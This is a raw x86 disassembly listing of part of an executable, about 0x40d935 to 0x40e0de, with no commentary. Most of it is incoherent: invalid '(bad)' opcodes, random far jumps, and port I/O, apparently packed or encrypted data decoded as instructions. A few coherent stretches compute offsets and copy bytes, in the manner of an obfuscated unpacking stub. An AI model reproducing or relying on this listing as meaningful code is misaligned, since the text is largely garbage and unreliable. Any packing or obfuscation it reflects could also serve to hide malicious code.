  40d935:	pop    es
  40d936:	mov    dl,0x7d
  40d938:	cmp    dl,ah
  40d93a:	adc    ah,ch
  40d93c:	and    eax,DWORD PTR [eax-0x41bab301]
  40d942:	push   ebx
  40d943:	pop    esp
  40d944:	mov    eax,esi
  40d946:	into   
  40d947:	cmp    BYTE PTR [edi-0x23],0x72
  40d94b:	sbb    al,0x58
  40d94d:	dec    DWORD PTR ds:0x6f765094
  40d953:	xchg   BYTE PTR [edi+0x18],dh
  40d956:	xor    eax,0xc5f113c0
  40d95b:	sub    bh,bl
  40d95d:	inc    ebp
  40d95e:	ins    BYTE PTR es:[edi],dx
  40d95f:	or     ch,BYTE PTR [ebx+0x38df1ece]
  40d965:	xor    BYTE PTR [edi-0x6e],bh
  40d968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d96a:	pop    edx
  40d96b:	int    0x12
  40d96d:	test   edx,ecx
  40d96f:	add    BYTE PTR [ebp+edi*8-0x48],al
  40d973:	dec    edx
  40d974:	push   eax
  40d975:	cmp    bl,ah
  40d977:	xchg   edx,eax
  40d978:	or     BYTE PTR cs:[edx-0x65],al
  40d97c:	repz pop ebx
  40d97e:	aaa    
  40d97f:	neg    esp
  40d981:	jg     0x40d9bc
  40d983:	sub    eax,0x994f5792
  40d988:	int3   
  40d989:	pop    ecx
  40d98a:	jge    0x40d9f8
  40d98c:	pop    es
  40d98d:	sub    bh,BYTE PTR [esp+ebp*1-0x4b]
  40d991:	lds    esi,FWORD PTR [edx+0x7de3bf45]
  40d997:	mov    ds:0x24cf7ad7,al
  40d99c:	cmc    
  40d99d:	sbb    BYTE PTR [ebp-0xa7d9a6b],dl
  40d9a3:	or     cl,BYTE PTR [esi]
  40d9a5:	fistp  QWORD PTR [edx+0x573e2ecc]
  40d9ab:	sub    BYTE PTR [esi],dl
  40d9ad:	lock shl ebp,1
  40d9b0:	and    eax,0x1c529d54
  40d9b5:	sbb    edi,DWORD PTR [ebx+0x4eadb2b6]
  40d9bb:	dec    edi
  40d9bc:	(bad)  [ecx-0x5c]
  40d9bf:	add    BYTE PTR [esi-0x21e37f06],0x90
  40d9c6:	ror    BYTE PTR [edx-0x3f1a62f0],0xe5
  40d9cd:	out    dx,al
  40d9ce:	xchg   BYTE PTR [ebx],dh
  40d9d0:	mov    dh,0x5
  40d9d2:	push   ebx
  40d9d3:	in     al,0xd8
  40d9d5:	ins    BYTE PTR es:[edi],dx
  40d9d6:	xor    al,0x1c
  40d9d8:	lahf   
  40d9d9:	fiadd  WORD PTR [ecx+0x8]
  40d9dc:	outs   dx,BYTE PTR ds:[esi]
  40d9dd:	stos   DWORD PTR es:[edi],eax
  40d9de:	popa   
  40d9df:	mov    bh,0x3a
  40d9e1:	mov    ebp,0x9fa72ff7
  40d9e6:	call   0x9025633a
  40d9eb:	fnstsw ax
  40d9ed:	inc    edx
  40d9ee:	test   al,0xd0
  40d9f0:	cmp    eax,0x57e4deb2
  40d9f5:	hlt    
  40d9f6:	call   0x6ec81ef9
  40d9fb:	cli    
  40d9fc:	loopne 0x40d9a5
  40d9fe:	sub    DWORD PTR [edi+0x13],edi
  40da01:	or     al,0x86
  40da03:	fsub   QWORD PTR [ecx-0x209d083e]
  40da09:	xor    al,0x92
  40da0b:	not    dh
  40da0d:	xlat   BYTE PTR ds:[ebx]
  40da0e:	or     al,0x6f
  40da10:	mov    eax,ds:0x887990f1
  40da15:	adc    dh,al
  40da17:	fistp  QWORD PTR [edx]
  40da19:	mov    eax,ds:0xc1066204
  40da1e:	jl     0x40da28
  40da20:	adc    al,0xb0
  40da22:	aad    0x1f
  40da24:	fdecstp 
  40da26:	add    al,0x4d
  40da28:	ja     0x40da6d
  40da2a:	or     eax,DWORD PTR [eax+0x4bf9b1c6]
  40da30:	push   0x86544aef
  40da35:	in     al,0x68
  40da37:	jo     0x40d9e5
  40da39:	retf   0x2ef
  40da3c:	mov    ebp,0x954a6a61
  40da41:	cmp    DWORD PTR [ecx-0x2e],esp
  40da44:	fsubr  DWORD PTR [esi+0x44]
  40da47:	or     al,0x88
  40da49:	ret    0x8bef
  40da4c:	aaa    
  40da4d:	inc    ebp
  40da4e:	jns    0x40dab1
  40da50:	in     al,dx
  40da51:	ret    
  40da52:	and    DWORD PTR [eax-0x79cc8fcf],0xf03facc8
  40da5c:	mov    ebx,0x21ac1d5
  40da61:	jns    0x40dade
  40da63:	add    dh,BYTE PTR [edx+0x6a]
  40da66:	(bad)  
  40da68:	cmp    al,0x78
  40da6a:	adc    bl,BYTE PTR [edx]
  40da6c:	dec    ebx
  40da6d:	out    dx,al
  40da6e:	mov    ds:0xb0d6737b,eax
  40da73:	(bad)  
  40da74:	or     esi,edi
  40da76:	mov    ds:0x2692cf82,al
  40da7b:	and    al,0xbb
  40da7d:	in     al,dx
  40da7e:	aas    
  40da7f:	jmp    0x9b8f:0x3226730c
  40da86:	jae    0x40dabf
  40da88:	pop    edx
  40da89:	test   cl,0x48
  40da8c:	ds push ebx
  40da8e:	mov    bl,0xa1
  40da90:	mov    eax,0xce41f02f
  40da95:	and    BYTE PTR [ecx-0x7c],ah
  40da98:	jg     0x40da5b
  40da9a:	out    0xa6,eax
  40da9c:	pop    ds
  40da9d:	dec    esp
  40da9e:	and    BYTE PTR [esi],bh
  40daa0:	pop    ebp
  40daa1:	cmp    DWORD PTR [ecx],ebp
  40daa3:	adc    BYTE PTR [eax],bl
  40daa5:	pop    eax
  40daa6:	sub    al,BYTE PTR [edi]
  40daa8:	xor    BYTE PTR [edi],ch
  40daaa:	xlat   BYTE PTR ds:[ebx]
  40daab:	call   0xaaf75d9f
  40dab0:	mov    ebp,0x387d7b30
  40dab5:	xchg   edi,eax
  40dab6:	shl    DWORD PTR [ebx+0x4],1
  40dab9:	cmp    BYTE PTR ds:0x89a74123,al
  40dabf:	aam    0x74
  40dac1:	xor    dh,BYTE PTR [ebp+esi*1+0x3c]
  40dac5:	sbb    al,0xad
  40dac7:	sbb    DWORD PTR [ebx-0x7c],esi
  40daca:	cmp    BYTE PTR [edx-0x4d],0x19
  40dace:	push   edx
  40dad0:	sub    edx,DWORD PTR ds:0x683f96c5
  40dad6:	pusha  
  40dad7:	push   ebx
  40dad8:	mov    ebp,DWORD PTR [edi+0x63d4e230]
  40dade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dadf:	movq   mm5,mm5
  40dae2:	popf   
  40dae3:	ret    
  40dae4:	rcr    DWORD PTR [eax-0x6745e208],1
  40daea:	out    dx,eax
  40daeb:	fucomip st,st(5)
  40daed:	fdivr  DWORD PTR [ecx-0x494f26c4]
  40daf3:	inc    ebx
  40daf4:	and    bh,BYTE PTR [ecx+0x45]
  40daf7:	cmp    al,dl
  40daf9:	popf   
  40dafa:	gs jne 0x40db7b
  40dafd:	ret    
  40dafe:	jns    0x40db07
  40db00:	test   al,0x92
  40db02:	push   0x3247efc7
  40db07:	jns    0x40da9e
  40db09:	iret   
  40db0a:	cmp    ebx,DWORD PTR [edi]
  40db0c:	or     eax,0xe8da283e
  40db11:	fwait
  40db12:	lock pop ebx
  40db14:	cmc    
  40db15:	cs rcr esi,0xfd
  40db19:	ror    edx,cl
  40db1b:	mov    es,WORD PTR [edx]
  40db1d:	sub    eax,0x9cb4086d
  40db22:	inc    esi
  40db23:	fnsave [eax+0x183dde78]
  40db29:	retf   0xc43a
  40db2c:	sti    
  40db2d:	xor    esi,DWORD PTR [ecx]
  40db2f:	imul   ecx,DWORD PTR [esp+esi*8+0x7c36a700],0x17f49636
  40db3a:	div    edi
  40db3c:	jg     0x40db90
  40db3e:	das    
  40db3f:	xlat   BYTE PTR ds:[ebx]
  40db40:	and    dh,ah
  40db42:	mov    ch,0x89
  40db44:	mov    eax,DWORD PTR [ebp+0x8]
  40db47:	imul   ecx,ecx,0x2e01
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40dc12
  40db97:	(bad)  
  40db98:	mov    ch,0x7c
  40db9a:	pop    ebx
  40db9b:	rcr    BYTE PTR [eax],cl
  40db9d:	sbb    dl,dl
  40db9f:	adc    al,0x18
  40dba1:	sbb    bh,dh
  40dba3:	add    edi,DWORD PTR [edx-0x20]
  40dba6:	pop    esi
  40dba7:	retf   
  40dba8:	xor    ebx,DWORD PTR [si]
  40dbab:	in     al,dx
  40dbac:	(bad)  
  40dbae:	pushf  
  40dbaf:	pop    ebx
  40dbb0:	mov    ds:0x95c06efc,eax
  40dbb5:	rcr    DWORD PTR [ecx-0x2d3ea6eb],0xff
  40dbbc:	xor    eax,0x4510b020
  40dbc1:	xchg   DWORD PTR [edx+0x321987d0],eax
  40dbc7:	imul   ebx,esi,0x4b
  40dbca:	add    dh,0xbc
  40dbcd:	inc    ecx
  40dbce:	sbb    DWORD PTR [eax+0x2],ecx
  40dbd1:	dec    ebx
  40dbd2:	fwait
  40dbd3:	mov    eax,0x1ee190de
  40dbd8:	pop    ss
  40dbd9:	out    dx,al
  40dbda:	pop    ecx
  40dbdb:	ins    BYTE PTR es:[edi],dx
  40dbdc:	xchg   edi,eax
  40dbdd:	iret   
  40dbde:	js     0x40dc0f
  40dbe0:	and    BYTE PTR [ebx-0x4e],dl
  40dbe3:	cmp    DWORD PTR [esi-0x3af12d45],ebx
  40dbe9:	mov    al,0x6c
  40dbeb:	mov    dh,0xf1
  40dbed:	adc    BYTE PTR [ebp-0x1f8d2c0e],al
  40dbf3:	inc    esi
  40dbf4:	shl    DWORD PTR [esi-0x33],1
  40dbf7:	mov    BYTE PTR [eax+0xd],bh
  40dbfa:	adc    eax,0x9954e034
  40dbff:	add    bl,bh
  40dc01:	xchg   ecx,eax
  40dc02:	pop    es
  40dc03:	popf   
  40dc04:	and    BYTE PTR [ecx-0x78],ch
  40dc07:	mov    al,ds:0xf358457d
  40dc0c:	fidiv  WORD PTR [edx+0x740f2668]
  40dc12:	popaw  
  40dc14:	popa   
  40dc15:	dec    ecx
  40dc16:	dec    edi
  40dc17:	adc    DWORD PTR ds:0xee601212,eax
  40dc1d:	sbb    BYTE PTR [ebp-0x556a8a6c],cl
  40dc23:	std    
  40dc24:	int3   
  40dc25:	int3   
  40dc26:	pop    es
  40dc27:	retf   
  40dc28:	and    al,0x14
  40dc2a:	pop    esp
  40dc2b:	mov    al,0xc6
  40dc2d:	dec    esp
  40dc2e:	lods   eax,DWORD PTR ds:[esi]
  40dc2f:	das    
  40dc30:	out    dx,al
  40dc31:	call   0xecddfcd0
  40dc36:	out    0x54,al
  40dc38:	jge    0x40dc20
  40dc3a:	ds aaa 
  40dc3c:	sahf   
  40dc3d:	sbb    al,BYTE PTR [ebp*4+0x3c1e5edb]
  40dc44:	or     eax,0xa313eeec
  40dc49:	dec    ah
  40dc4b:	adc    dh,BYTE PTR [ecx+0x43]
  40dc4e:	out    0xdb,al
  40dc50:	xchg   ebp,eax
  40dc51:	sahf   
  40dc52:	(bad)  
  40dc53:	popf   
  40dc54:	(bad)  
  40dc55:	sbb    DWORD PTR [edx-0x79157c49],0x64e1e6db
  40dc5f:	and    bh,al
  40dc61:	not    BYTE PTR [ebp-0x4998e7b9]
  40dc67:	rol    BYTE PTR [eax],1
  40dc69:	push   edi
  40dc6a:	test   bh,dl
  40dc6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc6d:	sbb    al,0x14
  40dc6f:	(bad)  
  40dc70:	push   ds
  40dc71:	xchg   esi,eax
  40dc72:	mov    al,0xdc
  40dc74:	pop    edx
  40dc75:	jmp    0xd9bf:0x81550a0
  40dc7c:	pop    ds
  40dc7d:	mov    dh,0x77
  40dc7f:	lock xor BYTE PTR [eax-0x6098ad41],0x13
  40dc87:	dec    BYTE PTR [ebp+0x753379aa]
  40dc8d:	rol    DWORD PTR [ebp-0x785c823b],1
  40dc93:	jge    0x40dcbf
  40dc95:	scas   al,BYTE PTR es:[edi]
  40dc96:	clc    
  40dc97:	inc    esp
  40dc98:	pop    es
  40dc99:	(bad)  
  40dc9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc9b:	add    bh,bh
  40dc9d:	popa   
  40dc9e:	mov    bl,0x7a
  40dca0:	mov    esp,0x957e4afa
  40dca5:	mov    ebp,0xb9fddcc
  40dcaa:	add    esp,DWORD PTR [ebp-0x16ad4fd3]
  40dcb0:	xchg   DWORD PTR [ebx+0x74410cdd],edx
  40dcb6:	fldenv ds:[esi-0x702eb3a3]
  40dcbd:	mov    ecx,0xc1d5c0c0
  40dcc2:	sub    al,0xb0
  40dcc4:	call   0x6cb5788a
  40dcc9:	cmp    ecx,ecx
  40dccb:	clc    
  40dccc:	pop    es
  40dccd:	mov    ebp,0x82625a9b
  40dcd2:	jmp    0x40dcff
  40dcd4:	xor    eax,0x837bd5ff
  40dcd9:	pop    ecx
  40dcda:	gs jb  0x40dd0d
  40dcdd:	ja     0x40dd04
  40dcdf:	js     0x40dd4a
  40dce1:	and    BYTE PTR [edi+0x69],dh
  40dce4:	retf   0x81f4
  40dce7:	outs   dx,BYTE PTR ds:[esi]
  40dce8:	std    
  40dce9:	xchg   ebx,eax
  40dcea:	pop    ss
  40dceb:	int3   
  40dcec:	(bad)  
  40dced:	sub    dl,BYTE PTR ds:0x71544143
  40dcf3:	inc    edx
  40dcf4:	fisub  DWORD PTR [ebx-0x4d]
  40dcf7:	inc    ebp
  40dcf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcf9:	cmp    eax,DWORD PTR [ebp+ebx*2-0x68]
  40dcfd:	stc    
  40dcfe:	xchg   ecx,eax
  40dcff:	js     0x40dd46
  40dd01:	ja     0x40dcd0
  40dd03:	add    edx,DWORD PTR [ebx+0x58]
  40dd06:	push   eax
  40dd07:	clc    
  40dd08:	pop    ecx
  40dd09:	jno    0x40dd6e
  40dd0b:	cmp    ah,ch
  40dd0d:	dec    eax
  40dd0e:	sub    BYTE PTR [ecx-0x29bbe068],0x43
  40dd15:	jg     0x40dd48
  40dd17:	add    eax,0x4bd52a78
  40dd1c:	mov    BYTE PTR [edi+edx*8],al
  40dd1f:	mov    ah,0xb6
  40dd21:	test   edx,esi
  40dd23:	leave  
  40dd24:	pop    esp
  40dd25:	pop    es
  40dd26:	push   edx
  40dd27:	mov    bh,0x18
  40dd29:	test   BYTE PTR [edi],ch
  40dd2b:	(bad)  
  40dd2c:	es push eax
  40dd2e:	call   0xb9c0:0xce270916
  40dd35:	push   ds
  40dd36:	xor    DWORD PTR [ebp+0x5b85f3f3],esi
  40dd3c:	cmp    esi,DWORD PTR [esp+ebp*1]
  40dd3f:	sbb    BYTE PTR [edx+eiz*8],0x33
  40dd43:	jecxz  0x40dd65
  40dd45:	adc    eax,0xf3377671
  40dd4a:	sub    bl,0x41
  40dd4d:	sti    
  40dd4e:	jg     0x40dcf7
  40dd50:	sbb    esp,eax
  40dd52:	pop    ebx
  40dd53:	or     ch,0xf8
  40dd56:	push   ebx
  40dd57:	dec    esi
  40dd58:	jge    0x40dd30
  40dd5a:	call   0xbd09:0x11c8a458
  40dd61:	add    cl,0x3f
  40dd64:	mov    esp,0x42ce900
  40dd69:	dec    edx
  40dd6a:	mov    ds:0xa779f8f1,eax
  40dd6f:	aas    
  40dd70:	sbb    eax,esi
  40dd72:	jo     0x40ddeb
  40dd74:	mov    dl,0x8a
  40dd76:	aas    
  40dd77:	mov    cl,0x60
  40dd79:	(bad)  
  40dd7a:	rep lods eax,DWORD PTR ds:[esi]
  40dd7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd7d:	mov    WORD PTR [edi-0x41],?
  40dd80:	rcl    BYTE PTR ss:[ebx],0x61
  40dd84:	out    dx,al
  40dd85:	xchg   BYTE PTR [eax-0x5f],bh
  40dd88:	xchg   esi,eax
  40dd89:	adc    ebx,eax
  40dd8b:	inc    esp
  40dd8c:	or     ah,BYTE PTR [ecx+0x33]
  40dd8f:	cs pop es
  40dd91:	and    eax,0xb70c38dc
  40dd96:	pop    es
  40dd97:	lods   eax,DWORD PTR ds:[esi]
  40dd98:	cmc    
  40dd99:	outs   dx,DWORD PTR ds:[esi]
  40dd9a:	xchg   BYTE PTR [edx+0x6f5a303a],ah
  40dda0:	(bad)  
  40dda1:	mov    ds:0x54b61df5,eax
  40dda6:	inc    esi
  40dda7:	aad    0x7f
  40dda9:	les    esi,FWORD PTR [esi]
  40ddab:	xor    DWORD PTR ds:0xa96e13a4,0xfffffffe
  40ddb2:	sub    DWORD PTR [esi+0x54],edx
  40ddb5:	or     al,BYTE PTR [ebp+0x3d]
  40ddb8:	dec    esi
  40ddb9:	push   esi
  40ddba:	cmp    al,0xfe
  40ddbc:	mov    ds:0x88e7d761,al
  40ddc1:	lahf   
  40ddc2:	das    
  40ddc3:	iret   
  40ddc4:	pop    es
  40ddc5:	mov    ds:0xce907a1e,eax
  40ddca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddcb:	(bad)  
  40ddcc:	jno    0x40de3c
  40ddce:	dec    esi
  40ddcf:	push   ebp
  40ddd0:	adc    eax,0x15c32faf
  40ddd5:	xchg   esp,eax
  40ddd6:	inc    ebx
  40ddd7:	pusha  
  40ddd8:	leave  
  40ddd9:	or     al,0xef
  40dddb:	mov    WORD PTR [esi-0x58],?
  40ddde:	(bad)  
  40dddf:	jp     0x40dd88
  40dde1:	cmp    cl,BYTE PTR [edi+eax*1-0x57]
  40dde5:	mov    ebx,0x937a9bbc
  40ddea:	mov    ebx,0x632b239b
  40ddef:	jl     0x40dd89
  40ddf1:	jecxz  0x40de48
  40ddf3:	mov    dl,bh
  40ddf5:	mov    esp,0xd300fe69
  40ddfa:	push   eax
  40ddfb:	jecxz  0x40de56
  40ddfd:	aaa    
  40ddfe:	adc    edi,DWORD PTR [ebp+0x70]
  40de01:	nop
  40de02:	cli    
  40de03:	xor    eax,0x1468133c
  40de08:	outs   dx,DWORD PTR ds:[esi]
  40de09:	test   al,0x92
  40de0b:	rcr    DWORD PTR [edx],cl
  40de0d:	and    cl,BYTE PTR [ecx-0x63]
  40de10:	jbe    0x40de86
  40de12:	push   esp
  40de13:	rol    DWORD PTR [ebx],1
  40de15:	adc    edx,DWORD PTR [ecx+0x10]
  40de18:	sub    ch,BYTE PTR [edi-0x5ede4eab]
  40de1e:	and    ah,cl
  40de20:	sbb    al,0xbd
  40de22:	pop    edx
  40de23:	pop    ds
  40de24:	sub    esp,esp
  40de26:	sbb    al,0x4b
  40de28:	add    al,0xac
  40de2a:	test   BYTE PTR [edi],0xd5
  40de2d:	cmp    bl,BYTE PTR [esi-0x6ea1153]
  40de33:	rol    bh,cl
  40de35:	cmp    al,0x21
  40de37:	and    edi,0x2b567f49
  40de3d:	mov    BYTE PTR [eax+edi*1+0x39],ah
  40de41:	dec    esp
  40de42:	add    edi,DWORD PTR [esi]
  40de44:	lods   eax,DWORD PTR ds:[esi]
  40de45:	sbb    eax,0xc731278a
  40de4a:	inc    ebp
  40de4b:	fdivr  QWORD PTR [edx]
  40de4d:	cmp    al,BYTE PTR [eax]
  40de4f:	add    bh,al
  40de51:	inc    ebp
  40de52:	in     al,dx
  40de53:	int    0x13
  40de55:	add    BYTE PTR [eax],al
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x422518
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40de7a
  40deca:	push   0x79
  40decc:	jl     0x40dee2
  40dece:	int3   
  40decf:	sbb    BYTE PTR [eax],bl
  40ded1:	rcl    BYTE PTR [eax+ebx*1],cl
  40ded4:	sbb    BYTE PTR [edi],bl
  40ded6:	cwde   
  40ded7:	(bad)  
  40ded8:	ficom  WORD PTR [edx]
  40deda:	cmp    BYTE PTR [ecx+0x21],ch
  40dedd:	sub    al,0xb8
  40dedf:	in     al,0xfb
  40dee1:	mov    esp,0x97a111e
  40dee6:	sahf   
  40dee7:	stc    
  40dee8:	xor    BYTE PTR [ebx-0x5d],bh
  40deeb:	rcr    eax,cl
  40deed:	outs   dx,BYTE PTR ds:[esi]
  40deee:	fdiv   st,st(4)
  40def0:	in     al,0xf1
  40def2:	add    ebx,DWORD PTR [ebx]
  40def4:	or     al,0xcc
  40def6:	mov    edi,0x5e8729b3
  40defb:	mov    WORD PTR [ebx-0x78],es
  40defe:	addr16 sahf 
  40df00:	or     cl,al
  40df02:	dec    esp
  40df03:	mov    ch,0xfd
  40df05:	jno    0x40df06
  40df07:	in     eax,0x62
  40df09:	imul   ecx,DWORD PTR [ecx-0x4e],0x61aaadb7
  40df10:	ret    
  40df11:	sub    eax,0xd3759466
  40df16:	(bad)  
  40df17:	in     eax,0x16
  40df19:	iret   
  40df1a:	jbe    0x40df34
  40df1c:	ror    BYTE PTR [esi],cl
  40df1e:	mov    edi,0xef89d7af
  40df23:	shl    BYTE PTR [edx+0x2e],1
  40df26:	sbb    ebp,DWORD PTR [edx+0x36]
  40df29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df2a:	je     0x40df7a
  40df2c:	mov    al,ds:0xec3f904d
  40df31:	xor    eax,0xf32458b0
  40df36:	inc    ecx
  40df37:	ret    
  40df38:	mov    dh,0x87
  40df3a:	cld    
  40df3b:	jg     0x40df72
  40df3d:	das    
  40df3e:	es cs scas al,BYTE PTR es:[edi]
  40df41:	ror    DWORD PTR [eax+0x7e7a5bca],cl
  40df47:	hlt    
  40df48:	andnps xmm4,XMMWORD PTR [edi+esi*4+0x2c50f64d]
  40df50:	xchg   ebx,eax
  40df51:	jle    0x40df77
  40df53:	shl    BYTE PTR [eax+ecx*8-0x69da6d90],0x82
  40df5b:	test   al,0xea
  40df5d:	dec    ebx
  40df5e:	push   esp
  40df5f:	sti    
  40df60:	jmp    0x40df20
  40df62:	jns    0x40df75
  40df64:	in     eax,dx
  40df65:	(bad)  
  40df66:	mov    eax,0x1d3efd90
  40df6b:	popa   
  40df6c:	or     al,0x6c
  40df6e:	cmp    al,0x2d
  40df70:	mov    ecx,edi
  40df72:	adc    bl,dh
  40df74:	sub    ecx,DWORD PTR [edi-0x57]
  40df77:	inc    ebp
  40df78:	stc    
  40df79:	push   edi
  40df7a:	out    0x80,al
  40df7c:	out    0x5b,al
  40df7e:	repnz outs dx,DWORD PTR ds:[esi]
  40df80:	xchg   ebp,eax
  40df81:	sti    
  40df82:	push   ebp
  40df83:	in     al,0x99
  40df85:	ja     0x40dfc3
  40df87:	test   DWORD PTR [eax],esi
  40df89:	lds    eax,FWORD PTR [edi]
  40df8b:	adc    al,0x73
  40df8d:	loopne 0x40dfcf
  40df8f:	mov    DWORD PTR [ebx+edi*4],ebx
  40df92:	repz or bl,BYTE PTR [ecx-0x43]
  40df96:	scas   al,BYTE PTR es:[edi]
  40df97:	repnz mov ah,0xa
  40df9a:	jae    0x40df39
  40df9c:	inc    ebp
  40df9d:	sbb    al,0xbd
  40df9f:	aas    
  40dfa0:	imul   eax,DWORD PTR [ecx+eax*8-0x2c0742bd],0xffffffb4
  40dfa8:	pop    eax
  40dfa9:	das    
  40dfaa:	test   eax,0x9b42e097
  40dfaf:	pusha  
  40dfb0:	dec    ecx
  40dfb1:	popf   
  40dfb2:	add    BYTE PTR [ecx-0x57],cl
  40dfb5:	xor    BYTE PTR [ebx+0x6b27a2c1],cl
  40dfbb:	sbb    al,0x40
  40dfbd:	pusha  
  40dfbe:	dec    ebx
  40dfbf:	stc    
  40dfc0:	scas   eax,DWORD PTR es:[edi]
  40dfc1:	or     DWORD PTR [edx-0x4a],eax
  40dfc4:	xlat   BYTE PTR ds:[ebx]
  40dfc5:	mov    ecx,0x18e1a7e6
  40dfca:	xor    eax,0x1c1f464a
  40dfcf:	push   ecx
  40dfd0:	cmp    BYTE PTR [esi],0xb1
  40dfd3:	lea    ecx,[edi+0xfca35f6]
  40dfd9:	rep ins DWORD PTR es:[edi],dx
  40dfdb:	push   cs
  40dfdc:	into   
  40dfdd:	clc    
  40dfde:	push   0x76220050
  40dfe3:	pop    esp
  40dfe4:	fld    TBYTE PTR [bp+di+0x323f]
  40dfe9:	fs sahf 
  40dfeb:	pop    edi
  40dfec:	imul   esi,DWORD PTR [eax],0x3d
  40dfef:	imul   esi,DWORD PTR [ebp+0x67],0x8b53e406
  40dff6:	cmp    BYTE PTR [ebx-0xb],al
  40dff9:	jmp    0x67e238b0
  40dffe:	push   ebx
  40dfff:	mov    ds:0x864544d8,al
  40e004:	out    0x15,al
  40e006:	call   0x3677:0xcf0e6289
  40e00d:	add    DWORD PTR [ecx],0xd810e4d4
  40e013:	sub    DWORD PTR [edi-0x29c837a7],ecx
  40e019:	std    
  40e01a:	cmp    eax,0x7dfdf10
  40e01f:	nop
  40e020:	fwait
  40e021:	rcr    DWORD PTR ds:0x5f3542f5,cl
  40e027:	je     0x40dfd1
  40e029:	daa    
  40e02a:	(bad)  
  40e02b:	loopne 0x40dfd8
  40e02d:	add    esp,DWORD PTR [ecx]
  40e02f:	jl     0x40dfb5
  40e031:	in     al,dx
  40e032:	(bad)  
  40e033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e034:	shr    DWORD PTR [esi],1
  40e036:	iret   
  40e037:	mov    bl,0xa2
  40e039:	clc    
  40e03a:	inc    edi
  40e03b:	sub    al,0x6c
  40e03d:	(bad)  
  40e03e:	out    dx,eax
  40e03f:	fimul  DWORD PTR [eax]
  40e041:	inc    edi
  40e042:	pop    edx
  40e043:	jb     0x40e044
  40e045:	(bad)  
  40e046:	in     al,dx
  40e047:	scas   eax,DWORD PTR es:[edi]
  40e048:	adc    eax,0xef74829
  40e04d:	loop   0x40e00c
  40e04f:	xchg   edx,eax
  40e050:	push   0x7d
  40e052:	xchg   esi,eax
  40e053:	xchg   ebp,eax
  40e054:	cmp    DWORD PTR [edx-0x28],edx
  40e057:	loop   0x40e037
  40e059:	aas    
  40e05a:	(bad)
  40e05e:	lds    esi,FWORD PTR [ecx]
  40e060:	call   0x5185e68b
  40e065:	mov    esp,0xa1be229d
  40e06a:	shl    esp,1
  40e06c:	adc    BYTE PTR [esi+0xd],bh
  40e06f:	xchg   ebx,eax
  40e070:	scas   al,BYTE PTR es:[edi]
  40e071:	mov    ch,dh
  40e073:	loopne 0x40e013
  40e075:	ds jge 0x40e00c
  40e078:	ret    0x4680
  40e07b:	shl    DWORD PTR [ebp+0x6da44ca0],0xec
  40e082:	in     eax,0x87
  40e084:	(bad)
  40e088:	pusha  
  40e089:	dec    ecx
  40e08a:	adc    BYTE PTR [ebp-0x634112f6],bl
  40e090:	icebp  
  40e091:	jnp    0x40e05a
  40e093:	push   ds
  40e094:	push   esp
  40e095:	inc    ebx
  40e096:	mov    dh,0x1c
  40e098:	jmp    0xc10de40c
  40e09d:	xor    eax,0xe2a8fed2
  40e0a2:	adc    DWORD PTR [edi+eax*2+0x515479ae],edi
  40e0a9:	add    ah,BYTE PTR [ebp+0x14fd2562]
  40e0af:	dec    ebx
  40e0b0:	arpl   WORD PTR [eax+0x4e1cb39d],si
  40e0b6:	leave  
  40e0b7:	call   0xac3a:0xacd0467e
  40e0be:	jne    0x40e08e
  40e0c0:	rcr    DWORD PTR [edx],cl
  40e0c2:	cli    
  40e0c3:	xor    eax,0xdadc424
  40e0c8:	push   edx
  40e0c9:	and    DWORD PTR [edi+0x7f],esi
  40e0cc:	add    DWORD PTR [edx],esp
  40e0ce:	mov    bl,0xad
  40e0d0:	(bad)  
  40e0d1:	ds push 0xa8941897
  40e0d7:	mov    bl,BYTE PTR [edi+0x98bb11a]
  40e0dd:	dec    ebp
  40e0de:	xor    eax,0xaa744b2
